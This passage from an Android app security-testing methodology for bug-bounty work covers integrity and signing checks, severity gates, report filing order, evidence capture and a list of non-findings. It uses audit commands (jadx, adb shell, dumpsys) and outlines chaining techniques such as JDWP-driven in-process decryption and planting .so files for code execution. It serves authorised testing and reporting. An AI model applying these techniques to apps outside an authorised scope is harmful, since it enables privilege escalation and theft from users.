- **Escalation:** Unblocks D02-063 (version rollback) and the version-diff workflow. -> D22 when the app keeps a low target deliberately to retain a blocked primitive.
- **Ruled out when:** The in-scope build's `targetSdkVersion` is at or above the platform minimum for every OS version in scope, so no install is ever blocked and no bypass flag is required. A failed install without this flag is a harness artefact, never a finding — do not report the artefact as corrupt.

### D02-065 · `@ChangeId` / `enableAfterTargetSdk` audit: security checks gated on the app's chosen targetSdk

| | |
|---|---|
| **Severity ceiling** | High when the gated code is a security check |
| **VRT** | Routes to the gated weakness (for the cited case, `server_side_injection.sql_injection` P1 via a provider) |
| **Attacker** | Any app that declares an old `targetSdk` — the attacker chooses it freely |
| **Applies to** | Android 10+ (the `CompatChanges` framework); exploitable by any app declaring `targetSdk` at or below the gate |
| **Maps to** | CVE-2026-28576 / GHSA-ph86-9mcx-3p6r; MHL: "Auditing `@ChangeId` annotations in system apps is a reliable way to find this bug class"; `github.com/mobilehackinglab/jadx-mcp-plugin` |

- **Test:** `@ChangeId` / `@EnabledAfter(targetSdkVersion = …)` annotations mark behaviour that is **off** for legacy-target callers. When the gated behaviour is a security control, the control is optional and the exploitable population becomes "every app that picks an old targetSdk".
- **How:**
```bash
jadx -d out/ ContactsProvider.apk          # or the target app, or any system APK you pulled
grep -rn "EnabledAfter\|@ChangeId\|CompatChanges.isChangeEnabled\|enableAfterTargetSdk" out/
adb shell dumpsys platform_compat | grep -i -A2 'ENFORCE\|packageOverrides'
```
- **Proof:** MHL recovered, from the on-device `ContactsProvider.apk`, both the Java gate and the XML declaration:
```xml
<compat-change enableAfterTargetSdk="36" id="484953293" name="ENFORCE_STRICT_SQL_CHECKS"/>
```
  and the fix was literally the deletion of `@EnabledAfter(targetSdkVersion = Build.VERSION_CODES.BAKLAVA)`. Quote the annotation, the change id, and a working call from an app declaring a target at or below the gate.
- **Escalation:** -> D07 (provider SQLi) -> D22 (version-specific behaviour). For system-app auditing at scale, drive jadx programmatically via the MHL jadx-mcp-plugin rather than reading one class at a time.
- **Ruled out when:** No `@ChangeId`/`enableAfterTargetSdk` annotation in the reachable code gates a security check (logging, metrics and layout behaviour do not count), **or** the app's own `targetSdk` is above every relevant gate *and* the bundled/system code it calls does not honour the caller's target. Verify the second half — a compat gate is evaluated against the **calling** app's target, which is the attacker's choice.

### D02-066 · Platform-signed non-system APK without a signature-permission allowlist entry

| | |
|---|---|
| **Severity ceiling** | Medium–High (OEM scope only) |
| **VRT** | `broken_access_control.privilege_escalation` (varies) |
| **Attacker** | n/a directly; this is a platform-key hygiene finding with privilege-escalation consequences |
| **Applies to** | **Android 15+**, platform-signed **non-system** apps only (platform-signed *system* apps are explicitly unaffected). Enforcement is off on debuggable builds. |
| **Maps to** | source.android.com/docs/core/permissions/signature-permission-allowlist (`<signature-permissions package="...">` XML under `/etc/permissions/`, named `signature-permissions-OEM_NAME.xml` / `signature-permissions-DEVICE_NAME.xml`) |

- **Test:** On Android 15+, a platform-signed non-system app's platform `signature` permissions must be allowlisted. If not allowlisted, on a non-debuggable build the permission is treated "as if the app isn't platform signed" — a security-relevant behaviour delta between debug and production builds.
- **How:**
```bash
adb shell ls /etc/permissions/ /system/etc/permissions/ /vendor/etc/permissions/ \
             /product/etc/permissions/ /system_ext/etc/permissions/ 2>/dev/null
adb shell cat /etc/permissions/signature-permissions-*.xml
adb logcat -b all | grep -i 'not in signature permission allowlist'
adb shell getprop ro.debuggable
```
- **Proof:** A logcat line of the documented form `Signature permission {PERMISSION_NAME} for package {PACKAGE_NAME} ({PACKAGE_PATH}) not in signature permission allowlist`, on a build where `ro.debuggable=1` — proving the app only works because enforcement is off.
- **Escalation:** An over-granted platform signature permission is a system-UID-adjacent capability -> D25.
- **Ruled out when:** The engagement does not include an OEM/preinstalled variant, **or** the device is Android 14 or lower (the allowlist does not exist), **or** every platform signature permission the app holds appears in an `/etc/permissions/signature-permissions-*.xml` entry on a `ro.debuggable=0` build with no allowlist warnings in logcat.

### D02-067 · Privileged-app permission allowlisting on OEM images

| | |
|---|---|
| **Severity ceiling** | High (OEM engagement) |
| **VRT** | `broken_access_control.privilege_escalation` (varies) |
| **Attacker** | AM-03 (an unprivileged app proxying through the privileged one) |
| **Applies to** | Android 8.0+ for the allowlist mechanism; Android 9+ for boot-blocking enforcement. **LEGACY:** on 8.0 and lower a missing entry simply fails to grant and the device still boots, so the absence of a boot failure proves nothing there. Allowlists can only grant or deny for privileged apps on the **same partition** (`/system`, `/product`, `/vendor` from Android 9; `/system` only on 8.1 and lower). |
| **Maps to** | source.android.com/docs/core/permissions/perms-allowlist; ATT&CK T1645 Compromise Client Software Binary, T1474.003 (Adups, Triada S0424) |

- **Test:** For apps in `/system/priv-app` or the vendor/product equivalents, every `signature|privileged` permission must be allowlisted in `/etc/permissions/privapp-permissions-*.xml` on the same partition. A permission granted without an entry, or a device booting with `ro.control_privapp_permissions=log`, means enforcement is off on a shipping image.
- **How:**
```bash
adb shell getprop ro.control_privapp_permissions        # expect "enforce"
adb shell pm path com.oem.target                        # /system/priv-app/... indicates privileged
adb shell cat /etc/permissions/privapp-permissions-*.xml | grep -A20 'com.oem.target'
adb logcat -b all | grep 'not in privapp-permissions allowlist'
adb shell dumpsys package com.oem.target | sed -n '/install permissions/,/runtime permissions/p'
adb shell dumpsys package com.oem.target | grep -n 'exported=true'
```
- **Proof:** `ro.control_privapp_permissions` returning `log` rather than `enforce`, plus logcat lines of the documented form `Privileged permission {PERMISSION_NAME} for package {PACKAGE_NAME} - not in privapp-permissions allowlist`, while `dumpsys package` still shows the permission `granted=true`. Then call the privileged action from a plain unprivileged test app through an `exported=true` component and show it succeeding.
- **Escalation:** Whatever the privileged permission guards — commonly `READ_PRIVILEGED_PHONE_STATE`, secure-settings writes, or carrier billing -> D25. Report to the OEM's VRP as well as the app owner.
- **Ruled out when:** The engagement is a store-distributed-only app (`pm path` shows `/data/app`), **or** `ro.control_privapp_permissions=enforce` with no allowlist warnings in logcat and every privileged permission present in the same-partition allowlist file.

### D02-068 · Establish the partition before claiming persistence

| | |
|---|---|
| **Severity ceiling** | Support (severity-accuracy gate — it prevents an over-rated report) |
| **VRT** | — |
| **Attacker** | n/a |
| **Applies to** | All |
| **Maps to** | AOSP security-model paper rule ④ ("Factory reset restores the device to a safe state") and §5 special cases: **Factory Reset Protection (FRP)** and **Widevine** are the two named deviations — Widevine's identifier "remains stable across factory resets" and is "scoped to the developer key to prevent cross-app tracking" |

- **Test:** Before writing up a "persistent compromise", establish which partition the artefact lives on. An artefact in `/data` is **not** persistent across factory reset, and claiming otherwise gets the finding downgraded.
- **How:**
```bash
adb shell mount | grep -E ' (/system|/vendor|/product|/data|/system_ext) '     # ro vs rw
adb shell getprop | grep -E 'ro\.boot\.(verifiedbootstate|flash\.locked|veritymode)'
adb shell ls -l /data/local/tmp /data/data/com.target.app
```
- **Proof:** `mount` showing `/system ... ro` with dm-verity backing it, versus your artefact's path under `/data`. If the artefact is under `/data`, the correct claim is "persists until factory reset", not "persists across factory reset".
- **Escalation:** None — this is a severity-accuracy gate that feeds D27.
- **Ruled out when:** n/a. Run it before every persistence claim; the two documented exceptions (FRP and the Widevine identifier) are the only things that legitimately survive a factory reset.

### D02-069 · Shell-Loop Ban on artefact sweeps — count your results

| | |
|---|---|
| **Severity ceiling** | Support (enabler; prevents the silent false negative) |
| **VRT** | — |
| **Attacker** | n/a |
| **Applies to** | Every automated sweep in this chapter — split pulls, per-split decompiles, groupId whois checks, DEX symbol loops, version-history iteration. Including agent-driven ones. |
| **Maps to** | `bb-methodology` PART 4 "Shell-Loop Ban" |

- **Test:** zsh array expansion fails **silently** on edge cases. A loop like `for x in "${arr[@]}"` can produce zero iterations with no error when the array was not populated by the previous command — and the output still looks complete. The source engagement lost roughly 50 probes' worth of testing to exactly this, with output that looked correct.
- **How:** Loops of ≤5 hardcoded items in shell are fine. Anything iterating a list, a file, or a computed range goes to Python with `try/except` per iteration and explicit per-iteration logging. **Always count**: if you expected 100 probes and got fewer than 50 lines, the loop ate something.
```bash
adb shell pm path com.target.app | tr -d '\r' | sed 's/package://' > /tmp/paths.txt
EXPECT=$(wc -l < /tmp/paths.txt); echo "expect $EXPECT"
# ... run the sweep ...
GOT=$(ls -1 splits/*.apk | wc -l); echo "got $GOT"
[ "$EXPECT" -eq "$GOT" ] || { echo "LOOP ATE RESULTS — do not proceed"; exit 1; }
```
- **Proof:** A result count that matches the input count, printed alongside the sweep output in the evidence file.
- **Escalation:** A silently short sweep in D02-004 suppresses D16 entirely; a short sweep in D02-055 turns a MavenGate hit into a clean bill of health. This item is why the ruled-out register is trustworthy.
- **Ruled out when:** n/a — it is a standing rule. "The sweep found nothing" is only a ruled-out when the counts match.

### D02-070 · Run the pre-severity gate against the Critical claim, not against the repack

| | |
|---|---|
| **Severity ceiling** | Support (governs every Critical/High claim in this chapter) |
| **VRT** | — |
| **Attacker** | n/a |
| **Applies to** | Every Critical or High D02 claim |
| **Maps to** | `triage-validation` PRE-SEVERITY GATE; `bb-methodology` Phase 5 Multi-Tool Reproduction Bar |

- **Test:** Write the draft Critical title, then substitute **the Critical claim** — not the bug — into each question: (1) Have I validated the FULL chain to attacker-attainable impact, or only one primitive in the middle? "Primitive confirmed at layer N" is not exploitable. (2) What does the attacker walk away with, in one concrete sentence? (3) Have I personally reproduced the full chain end to end **at least twice** — once during discovery, once for the PoC? (4) Is there an inheritance gate, signature check, audience check or other validation still gating the chain? If yes it is not Critical: document it as "primitive present" at a lower severity. (5) Has the program rejected this severity class before?
- **How:** D02's specific traps, in the order they bite:
  - "The APK can be repackaged" is not the claim. The claim is "a repacked client obtains X from the server". Q4 is `does the backend re-verify?` — if it does, you have a P5 hardening note.
  - "The update channel is unsigned" is not the claim. The claim is "an attacker-supplied artefact executes in the app's UID". Q1 requires the marker file, not the interception.
  - "A credential is hardcoded" is not the claim. The claim is "this credential authenticates to a publicly reachable asset". Q6 without the liveness proof drops you from P1 to P5 (`intentionally_public_sample_or_invalid`).
  - "debuggable=true" is not the claim. The claim is "a zero-permission local actor reads a live session token from a stock production device".
  Reproduce every Critical/High with **two independent mechanisms** — for D02 that usually means the manual `apksigner`/`adb` path plus a scripted or Frida-instrumented path — and make the reproduction commands paste-into-shell ready.
- **Proof:** A documented pass/kill decision per finding, with the reproduction count.
- **Escalation:** n/a. The corpus's worked failure is instructive: a JWT `alg:none` primitive was labelled Critical on a confirmed signature bypass, the issuer-trust check still rejected unsigned tokens, the chain never completed, and it had to be retracted. The D02 analogue is a grafted signing block accepted by a debug build of the verifier but rejected by the shipping one.
- **Ruled out when:** n/a — a standing gate. Note the opposite rule too: do **not** retract a confirmed finding that stopped reproducing because the client patched mid-engagement. Keep timestamped pre-patch evidence and document the detection timeline; that is different from a finding that never reproduced, which goes in the retraction appendix with its disproving evidence and the root cause of the false positive.

### D02-071 · Chain-filing order for D02 primitives

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | — |
| **Attacker** | n/a |
| **Applies to** | Every multi-finding D02 engagement (which is most of them — this domain produces primitives, not endpoints) |
| **Maps to** | `bugcrowd-reporting` §5 (chain filing), §8 (submission-order strategy) |

- **Test:** D02 is a primitive factory: debuggable, a missing integrity check, an unsigned update channel, a writable lib directory. Each has an **independent fix surface**, so each is its own report under a "one fix = one bounty" rule — but the consumer report needs their IDs, which only exist once they are filed.
- **How:** (1) Identify the highest-severity chained outcome (usually "code execution in the app UID" or "account takeover from an extracted token"). (2) File each primitive as a separate report at its **standalone** severity — typically P3/P4 — with a placeholder cross-reference line. (3) File the chain consumer with the full narrative at the chained severity, filling in the real primitive IDs. (4) Edit each primitive to backfill the consumer's ID. Consumer body:
```markdown
## Chain partners (filed as separate reports)
- **submission [UUID-1]** — [primitive 1: e.g. release build ships android:debuggable="true"]
- **submission [UUID-2]** — [primitive 2: e.g. session token stored unencrypted in shared_prefs]
These primitives have independent fix surfaces and are filed separately per the program's
"one fix = one bounty" rule.
```
  **Do not** paste the whole chain narrative into every primitive, claim each primitive is independently P1, or ask for one combined bounty. A chain is a **severity amplifier, not a merge request**. Submission order: primitives, then the consumer, then clean standalone P3s, then anything scope-risky last — and never file everything in one batch within minutes, which triagers read as low-effort spam.
- **Proof:** Cross-referenced IDs in both directions.
- **Escalation:** n/a.
- **Ruled out when:** n/a — procedure. The one case where you should *not* split is when the primitives genuinely share a single fix (e.g. `debuggable="true"` and `setWebContentsDebuggingEnabled(true)` are both "the release build was configured as a debug build"), in which case bundle them into one "debug artefacts shipped to production" item, as D02-035 notes.

### D02-072 · Evidence capture for an integrity finding: what to show and what to mask

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | — |
| **Attacker** | n/a |
| **Applies to** | Every D02 finding that changes state (repack unlocks a feature, substituted artefact installs, rollback re-enables a bug) |
| **Maps to** | `evidence-hygiene` (redaction methods, the visible/masked split); `bugcrowd-reporting` 5-screenshot state-change pattern |

- **Test:** A D02 state-change finding needs the same five-shot discipline as any state-change bug, adapted to the artefact world.
- **How:** The five shots, in one sitting, without reloading between them (a relaunch regenerates session state and invalidates prior captures):
  1. **Pre-state**: the stock build in place — `apksigner verify --print-certs` of the *installed* APK plus the gated feature refusing.
  2. **The bug itself** — the substituted/patched artefact being accepted: the install succeeding, the verifier's "valid signature" log line, or the marker file appearing. The most important shot.
  3. **Post-state negative** — proof the change took effect: `pm list packages -i` naming your installer, or `apksigner verify --print-certs` on the installed file showing **your** certificate.
  4. **Post-state positive** — the gated action now succeeding, captured at the **server**: the authenticated 200 in the proxy, not the UI.
  5. **Side effect** — whether any passive defence fired: a tamper telemetry call, a forced logout, a notification. Its *absence* is evidence too.
  Filenames `{finding-#}-step{n}-{description}.png` (e.g. `04-step2-grafted-v2-block-accepted.png`), referenced by filename in the report body.
  Redaction: prefer not capturing secrets at all — screenshot the console, not the Network Headers panel; drag the Burp Repeater divider down to hide the request body. **Mask**: bearer/refresh tokens, the extracted credential's full value, PAN, the client's internal hostnames. **Leave visible**: trace IDs (`x-request-id`, `x-datadog-trace-id`), your own attacker UID, JSON key names, the artefact SHA-256 from D02-001, and the signer certificate digests — the triager needs every one of those to correlate against build and server logs. After submission, rotate the test-account password and re-sign with a throwaway key so anything shown in a screenshot is dead.
- **Proof:** The five files, plus the artefact manifest from D02-001 so every screenshot is pinned to a hash.
- **Escalation:** Feeds D27 directly. Note that for a public write-up, mobile-app **package identifiers** belong on the intentionally-absent list alongside client names, hostnames and per-finding payloads.
- **Ruled out when:** n/a — procedure. A D02 finding with no server-side shot (step 4) is the most common downgrade in this domain: the UI changed, and nothing was proved.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "The APK can be decompiled / is not obfuscated" | `lack_of_binary_hardening.lack_of_obfuscation` = **P5**. Google Invalid Reports: "Most applications (including Android apps) can be reverse engineered... in itself, being able to determine internal information about how an application works is not a vulnerability." HackenProof, Grab, Spotify, Starbucks and Xiaomi all list it out of scope verbatim. | Recover a *specific* secret or algorithm from behind the obfuscation — call the app's own string-decryptor with Frida and print the HMAC key or API base — then report the crypto/authz finding underneath (D02-047, -> D12, -> D15). |
| "The app can be repackaged and re-signed" | P5. The repack is a tool, not a bug. Ask whether the impact sentence survives deleting the words "an attacker can decompile the APK"; if not, it is not a finding. | The repack unlocks a server-honoured entitlement, auth bypass or price change — and the **server** accepts the request the stock client could never send (D02-045, D02-022). |
| "Missing binary hardening: no PIE, no stack canaries, no ARC" | `lack_of_binary_hardening.lack_of_exploit_mitigations` = **P5**, CWE-693, with the all-zeros impact vector `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N` — the taxonomy scores it at no impact. | Nothing in this domain. Fold into a hardening appendix in a client report; never a bounty submission. |
| "No root / emulator / tamper detection" | `lack_of_binary_hardening.lack_of_jailbreak_detection` = **P5**. Your own rooted device is AM-12 and is not an attacker. | Only as the enabling sentence of a finding whose impact is demonstrated elsewhere (D21), never as the finding. |
| "v1 signature present alongside v2/v3" | Not a finding at all. v1 co-presence is normal for backward compatibility; only **v1-only** is the Janus precondition, and only with a `minSdkVersion` reaching an affected platform. | `apksigner verify --verbose` showing v2 **and** v3 false, plus a successful `adb install -r` of a modified build on an in-scope OS version (D02-012). |
| "No v4 signature / no `.idsig` file" | v4 (Android 11+) supports ADB incremental install; its absence is a delivery-performance characteristic, not a security control. | Nothing. Record the scheme set (D02-011) and move on. |
| "1024-bit RSA signing key" | MASTG-TEST-0225 fails it, but forging a 1024-bit RSA signature is not practical today, so programs rate it Low at best. | Fold it into a single combined "app integrity is not cryptographically assured" item with D02-012 and D02-015 rather than filing a standalone Low. |
| "`android:allowBackup="true"`" | `mobile_security_misconfiguration.auto_backup_allowed_by_default` = **P5**. H1 #1225158 (Zivver), "ADB Backup is enabled within AndroidManifest", paid **$0** — the flag was the whole report. | A live session token or credential recovered from the unpacked `.ab` tarball and replayed successfully against the production API (D02-031, -> D11, -> D13). |
| "`android:debuggable="true"`" with nothing extracted | The flag alone. MASTG links Android's own note that it "is not considered a direct vulnerability". | `run-as` output on a **stock, non-rooted, `ro.build.type=user`** device containing an actual token or credential, plus the replayed 200 (D02-029). |
| "OAuth `client_secret` found in the APK" | `sensitive_data_exposure.sensitive_data_hardcoded.oauth_secret` = **P5**, and it is on the never-submit list: a mobile app is a *public* client and is not supposed to hold a confidential secret. | The inversion: the reportable finding is **PKCE non-enforcement** at the authorisation server — show that an authorisation code obtained without a `code_verifier` still exchanges for a token (-> D13). |
| "Firebase web API key / Maps key in `strings.xml`" | `sensitive_data_exposure.disclosure_of_secrets.intentionally_public_sample_or_invalid` = **P5**; a billable-but-not-sensitive key is `...pay_per_use_abuse` = **P4**, not P1. | The key has no package+SHA-1 restriction and reaches a *sensitive* asset — verified by calling the API from an unrestricted host and getting data back (D02-047, -> D18). |
| "Library X is at an outdated version" with no reachability | `using_components_with_known_vulnerabilities.outdated_software_version` = **P5**. R8/LLVM dead-code elimination routinely strips the vulnerable method entirely. | The symbol survives into `classes*.dex`, a caller chain reaches it from an exported entry point, and a Frida hook proves the frame is entered with attacker-supplied data (D02-060). |
| "The app crashes when a split is missing" | Fail-closed is the **correct** behaviour. Crash-only DoS via intents is `application_level_denial_of_service_dos.app_crash.malformed_android_intents` = **P5** (H1 #3399016 scored 0.0). | The opposite observation: the app launches base-only and a module-gated control is skipped (D02-038). |
| "`adb install` failed with `INSTALL_FAILED_DEPRECATED_SDK_VERSION`" | A harness artefact of the test device's Android version, not a property of the app. | The client's own distribution channel (enterprise MDM, sideload updater) ships a sub-minimum-target APK that the platform would otherwise refuse (D02-064). |
| "A Frida gadget can be injected / the app can be instrumented" | `lack_of_binary_hardening.runtime_instrumentation_based` = **P5**. This is your tooling. | Nothing in this domain. Report what the instrumentation revealed, in whichever domain owns it. |
| "Testing on my own rooted device showed X" | AM-12 is not an attacker model. A root-only observation is at most P5 storage. | Demonstrate the same read via a no-root path — `run-as` on a debuggable build, `adb backup`, a backup transport, or a same-UID sibling (D02-029, D02-031). |
| "Duplicate `classes.dex` / Master Key reproduces" (claimed, untested) | Long fixed on every supported Android; the class is LEGACY. | A successful `adb install -r` **on an in-scope OS version**, with the injected DEX executing (D02-013). Verify very carefully before reporting. |

## Cross-surface joins

- **D02 split set × D03 manifest model.** Reviewers decode `base.apk` and enumerate components from its manifest. A `config.*` or feature split ships its **own** manifest fragment, so an exported provider or receiver that exists only in a split is invisible to a base-only review and to every drozer scan run against the base package's declared components. Join: run the `aapt2 d xmltree` component sweep over **every** split (D02-040), then feed the delta into D03/D05/D06/D07 as a second pass. The delta is where the unreviewed components live.
- **D02 Play App Signing key × D09 Digital Asset Links.** The `assetlinks.json` fingerprint must match the **app signing key** Google re-signs with, not the upload key that signed the artefact you were handed. A team that rotates the upload key, or that publishes the upload fingerprint, ships App Links that never verify — and a malicious app registering the same host filter then wins link traffic. Nobody checks these two surfaces together because one lives in Play Console and the other on a web server (D02-006).
- **D02 `android:debuggable` × D12 Android Keystore.** A "the key never leaves Keystore, so extraction is impossible" design is defeated without extracting anything: JDWP-attach the debuggable process and **call the app's own decrypt routine in-process**. The Keystore review concludes "hardware-backed, not extractable" and the D02 review concludes "debuggable, P5 hardening note" — the join is arbitrary decryption of every locally stored ciphertext (D02-030).
- **D02 missing-split fail-open × D21 RASP/attestation.** The RASP review tests whether the root check can be hooked. The feature-delivery review tests whether the app runs without its modules. Nobody asks whether the **attestation code lives in a split** — if it does, a base-only install removes the control entirely, with `base.apk`'s signature untouched and no instrumentation for RASP to detect (D02-038).
- **D02 version history × D15 shadow API.** The endpoints hardcoded in build N-3 are an *older API version* than the current web app uses, with weaker auth, weaker rate limits, weaker validation and more field exposure. The mobile reviewer looks at the current APK; the API reviewer looks at the current web traffic; neither looks at the artefact that documents the version the vendor forgot to retire. Diff **behaviourally**, per operation — a version difference alone is Informational (D02-009).
- **D02 `knownSigner` allowlist × D06 bound services.** The IPC reviewer sees `protectionLevel="signature"` and marks the service protected. The signing reviewer sees a certificate digest array and marks it inventory. Joined on Android 12+, `knownSigner` means *any* party holding *any* key in that array — including a rotated-away key or a low-trust partner's — takes the permission automatically and with no user notification (D02-017).
- **D02 merged-manifest creep × D14 network security config.** The network reviewer confirms `cleartextTrafficPermitted="false"` from the app's source manifest and concedes the cleartext finding as mitigated. The **merged** manifest is the one that ships, and an SDK can re-add `usesCleartextTraffic="true"` or replace the `networkSecurityConfig` reference through ordinary merger rules. The join re-opens a finding both reviewers had closed (D02-044).
- **D02 `lib-*/` drop zone × D07 FileProvider path traversal.** The provider reviewer finds a traversal write and rates it "arbitrary file write into the app sandbox" — Medium. The package-layout reviewer knows `/data/data/<pkg>/lib-*/` is loaded at process start. Joined, the write primitive lands a `.so` under the name of a library the app loads and becomes persistent code execution in the app's UID on next launch (D02-042; the Evernote and Mattermost shape).
- **D02 resource flag flip × D23 entitlements × D15 backend.** Three reviewers each see a third of this: a `is_premium` string in `res/values`, a paywall in the payments flow, an entitlement field in an API response. The join is one test — flip the resource, rebuild, and check whether the **server** honours the premium-only call. If it does, a P5 "app can be repackaged" becomes a payments finding (D02-045).
- **D02 custom verifier × D07 path traversal × D02 deterministic cache.** The Samsung Galaxy Store chain is exactly this join: a verifier that checks the signature over a digest without recomputing it, a deterministic cache path, and a write primitive to reach that path. Each alone is a Medium-at-best observation; together they are arbitrary app installation under a trusted signer allowlist (D02-025, D02-026).

## Sources

- **OWASP MASTG / MASVS / MASWE**: MASTG-TEST-0212, -0224, -0225, -0226, -0227, -0272, -0274; MASTG-TECH-0003, -0007, -0031, -0040, -0116, -0117, -0130, -0131, -0141, -0142, -0145, -0150; MASTG-TOOL-0004, -0007, -0011, -0019, -0100, -0103, -0123, -0125, -0130, -0131, -0132, -0134, -0144; MASWE-0003, -0004, -0011, -0044, -0048, -0049, -0056, -0063; MASTG-KNOW-0003, -0004, -0007, -0028.
- **Bugcrowd VRT release 2026-07-08** (581 entries), read from `data/bugcrowd-vrt-full.csv` for every priority and path quoted in this chapter.
- **AOSP / Android developer documentation**: `source.android.com/docs/security/features/apksigning` (schemes v2, v3, v3.1, v3.2, v4); the AOSP security-model paper §4.7.1 item (5) and rule ④ with its FRP/Widevine exceptions; `source.android.com/docs/core/permissions/perms-allowlist`; `source.android.com/docs/core/permissions/signature-permission-allowlist` (Android 15); Android 12 behaviour changes (`adb backup`, `dataExtractionRules`, D2D transfer); Android 13 features (v3.1, `--rotation-min-sdk-version`); Android 14/15 behaviour changes (minimum installable target, `--bypass-low-target-sdk-block`); `guide/app-bundle/play-feature-delivery`; `guide/app-bundle/app-bundle-format`; risk articles `android-debuggable`, `test-debug`, `create-package-context`; `tools/bundletool`, `tools/apkanalyzer`; the Conscrypt module trust-store note for API 34+.
- **MITRE ATT&CK Mobile**: T1406, T1406.002, T1407, T1409, T1474.001, T1474.003, T1533, T1544, T1577, T1623.001, T1632, T1632.001, T1645, T1661; analytic AN1730; mitigations M1001, M1002, M1004, M1006, M1011, M1012, M1013; procedure examples Agent Smith S0440, BOULDSPY S1079, SharkBot S1055, Triada S0424, XcodeGhost S0297.
- **CVEs and advisories**: CVE-2017-13156 (Janus, EDB 47601), CVE-2013-4787 (EDB 38627), CVE-2013-6792 (EDB 38821), CVE-2021-0341, CVE-2020-8913, CVE-2021-29427 / GHSA-jvmj-rh6q-x395, GHSA-j6wc-xfg8-jx2j, CVE-2026-28576 / GHSA-ph86-9mcx-3p6r, CVE-2022-2294 (Project Zero RCA, cited for the reachability argument).
- **Disclosed reports**: H1 #1377748 (Evernote, High), #1115864 (Mattermost, High 7.8), #1362313 (Evernote sibling), #1225158 (Zivver, $0), #3829030 (Yelp Business, Low 3.3), #3399016 (Nextcloud, 0.0).
- **Vendor and program policy**: Google Mobile VRP arbitrary-code-execution examples and payout tiers; Google Invalid Reports ("Decompiling/reverse engineering an app"); HackenProof mobile out-of-scope list; HackerOne Platform Standards, "Bounty Awards for Discovered Leaked Credentials"; Grab, Spotify, Starbucks and Xiaomi out-of-scope language.
- **Research and tooling**: Oversecured "Introducing MavenGate" (3,710/26,163 domains, 18.18% of dependencies); the Samsung Galaxy Store / S25 verifier-confusion chain (bugscale); Gradle "Protecting Project Integrity" and the dependency-verification userguide; the Gradle Dependency Analysis Plugin (DAGP 3.5.0+) Maven-Hijack post; LibScout; osv-scanner; cdxgen / Syft / CycloneDX Gradle plugin; APKiD; clsdumper; apk-mitm; uber-apk-signer; objection `patchapk`; drozer (`app.package.debuggable`, `exploit.jdwp.check`, `tools.file.*`, `scanner.misc.*`); MobSF rule `android_aar_jar_debug_enabled`; Mobile Hacking Lab (`jadx-mcp-plugin`, the `@ChangeId` audit technique); reFlutter; hbctool; Payatu's Hermes modification workflow.
- **Community checklists and write-ups**: HackTricks (`android-applications-basics.md`, `smali-changes.md`, superpacked applications); sec-88 (Janus page, checklist §5/§7/§17, InsecureBankv2 walkthrough); Het Mehta Phase 2; Hrishikesh C07/C17; Nerdwell's Bugcrowd LevelUp "Finding Sensitive Data in Android Apps"; the Bugcrowd "Ultimate beginner's guide to Android hacking"; COFFSec's 10-methods write-up; sh4hin MobileApp-Pentest-Cheatsheet; YesWeHack's Android recon guide; hackwithsingh sec-14-5 / sec-14-18; riya78 §5/§6; Gowthams `approach.md` (BFAC); sehno's configuration-management checklist.
- **Claude-BugHunter corpus (elementalsouls)**: `apk-redteam-pipeline` (Stages 0–3 and its anti-patterns), `hunt-shadow-api` (the mobile-to-backend version-diff bridge and its severity table), `bb-methodology` PART 4 (Shell-Loop Ban, Body-Diff Rule, Marker Discipline, Multi-Tool Reproduction Bar), `triage-validation` (7-Question Gate, Pre-Severity Gate, retraction discipline and its inverse), `evidence-hygiene` (the five-screenshot state-change pattern and the mask/leave-visible split), `bugcrowd-reporting` §5 and §8 (chain-filing order and submission sequencing), `recon-scope-triage` (the soft-404 control).
- **Local senior-researcher corpus**: refs 00, 03, 05, 06, 08, 18 (§D, §D.1–D.3, §E, §L, §M), 20, 23 (the graveyard), 24 (§A4.7) — repack-as-a-lever table, the three-way `debuggable` detection, split-set re-signing, and the re-signing cost list.
